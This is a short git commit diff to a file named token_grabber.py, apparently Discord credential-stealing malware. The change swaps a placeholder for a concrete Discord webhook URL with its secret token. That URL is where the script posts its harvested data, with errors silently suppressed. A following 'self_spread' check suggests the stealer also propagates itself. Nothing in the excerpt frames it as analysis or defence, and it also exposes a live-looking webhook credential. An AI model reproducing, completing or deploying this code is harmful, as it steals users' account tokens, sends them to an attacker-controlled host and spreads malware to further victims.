7281125d83a238321ee02bc03c88c709f3536f49
Darkpatato <darkpatato.dev@gmail.com>
2024-12-30 23:35:45 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1323411269365137499/WfL9aI9HzuGHKZylac3fWoK-KpNbxp9Yqt5yXcnJJu1jbjT_2viuFgEg-SoL3Kfg0iIU", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
